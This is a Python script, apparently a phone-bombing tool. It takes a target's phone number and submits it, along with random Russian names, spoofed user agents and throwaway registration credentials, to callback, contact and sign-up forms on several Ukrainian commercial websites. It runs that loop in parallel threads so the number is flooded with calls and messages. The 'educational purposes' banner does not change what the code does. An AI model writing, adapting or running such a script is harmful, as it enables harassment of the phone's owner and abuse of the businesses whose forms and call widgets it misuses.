import requests,os,sys,random,time,string, threading

from fake_useragent import UserAgent

from colorama import Fore, init



ua = UserAgent()


init()



os.system('cls') if os.name == 'nt' else os.system('clear')



class logging:
	@staticmethod
	def succes(*args):
		print(f"{Fore.LIGHTBLUE_EX}> {Fore.RESET}{args}")
	@staticmethod
	def error(*args):
		print(f"{Fore.LIGHTRED_EX}[ERROR:] {args}")



banner = rf"""
{Fore.LIGHTWHITE_EX}

                                 
 ______  _______         _____   
(______)(_______)       (_____)  
{Fore.LIGHTRED_EX}(_)__       _(_)   ___ (_)   (_) {Fore.LIGHTWHITE_EX}
(____)    _(_)   _(___)(_)   (_) 
(_)____  (_)____(_)___ (_)___(_) 
{Fore.LIGHTRED_EX}(______)(_______)(____) (___(__) {Fore.LIGHTWHITE_EX}
                              (_)
{Fore.LIGHTWHITE_EX}--------------------------------------------
{Fore.LIGHTRED_EX} This tool is only for Educational Purposes !!
{Fore.LIGHTWHITE_EX}--------------------------------------------
                         
"""


def randomName():
	list = ['Станислав', 'Артём','Егор','Максим','Денис','Валентин','Василий Петров','Ваня','Иван','Владимир','Денис']
	return random.choice(list)



print(banner)



print(f"{Fore.LIGHTWHITE_EX}Number (without '+'){Fore.LIGHTRED_EX} > ", end ='')
_phone = input().strip('+')


name = ''.join(random.choice(string.ascii_letters) for y in range(5) ) 
email = name + "@hotmail.com"
password = name + '1234' * 3

def start():
	r = requests.post(
			url = 'https://spa-studio.com.ua/sender/request-modal/core/sender.php',
			data = {"name":randomName(),
					"phone":f"+38({_phone[2:5]}) {_phone[6:7]}-{_phone[8:9]}-{_phone[10:12]}" },
			headers = {'User-Agent':ua.random} 
		)
	print(f"{Fore.LIGHTWHITE_EX}{r.status_code} | {Fore.LIGHTRED_EX}{r.url}")
	r = requests.post(
			url = "https://forms.tildacdn.com/procces/",
			data = {'Name':randomName(), "Phone":f"+38({_phone[2:5]}){_phone[6:7]}{_phone[8:9]}{_phone[10:12]}"},
			headers = {'User-Agent':ua.random}
		)
	print(f"{Fore.LIGHTWHITE_EX}{r.status_code} | {Fore.LIGHTRED_EX}{r.url}")
	r = requests.post(
			url = "https://santalen.com.ua/androlog-urolog-2/?gclid=Cj0KCQiAubmPBhCyARIsAJWNpiMn-yZL9lILSOUOZ13tfwa8CFqEbIZgKH6FwHaKcsDc_y1YYdIztpoaAgfhEALw_wcB",
			data = {'your-name':randomName(),
					'tel-89':f'+38({_phone[2:5]}) {_phone[6:7]} {_phone[8:9]} {_phone[10:12]}',
					'menu-271':"[Для взрослых] Массаж",
					"textarea-332": "Давайте созвонимся"},
			headers = {'User-Agent':ua.random}
		)
	print(f"{Fore.LIGHTWHITE_EX}{r.status_code} | {Fore.LIGHTRED_EX}{r.url}")
	r = requests.post(
			url = "https://profmedical.com.ua/wp-admin/admin-ajax.php",
			data = {
				"action":"send_mess",
				"name":randomName(),
				"phone":f"+{_phone}"
			},
			headers = {
				'User-Agent':ua.random
			}
		)
	print(f"{Fore.LIGHTWHITE_EX}{r.status_code} | {Fore.LIGHTRED_EX}{r.url}")
	r = requests.post(
			url = 'https://widgets.binotel.com/getcall/call/',
			data = {
				'externalNumber':f"{_phone[1:]}"
			},
			headers = {
				"User-Agent":ua.random
			}
		)

	print(f"{Fore.LIGHTWHITE_EX}{r.status_code} | {Fore.LIGHTRED_EX}{r.url}")
	r = requests.post(
			url = 'https://alcomag.ua/auth/registration/?register=yes&backurl=%2Fauth%2F',
			data = {
				"REGISTER[NAME]":f"{name} {name} {name}",
				"REGISTER[EMAIL]":f"{email}",
				"REGISTER[PERSONAL_PHONE]":f"+38 ({_phone[2:5]}) {_phone[5:8]}-{_phone[9:10]}-{_phone[11:12]}",
				"REGISTER[PASSWORD]":f"{password}",
				"licenses_register":"Y",
				"REGISTER[PHONE_NUMBER]":f"+38 ({_phone[2:5]}) {_phone[5:8]}-{_phone[9:10]}-{_phone[11:12]}",
				"register_submit_button1":"Y"
			} ,
			headers = {
				'User-Agent':ua.random
			}
		) 
	print(f"{Fore.LIGHTWHITE_EX}{r.status_code} | {Fore.LIGHTRED_EX}{r.url}")	 

for i in range(4):
	threading.Thread(target = start, args = ()).start()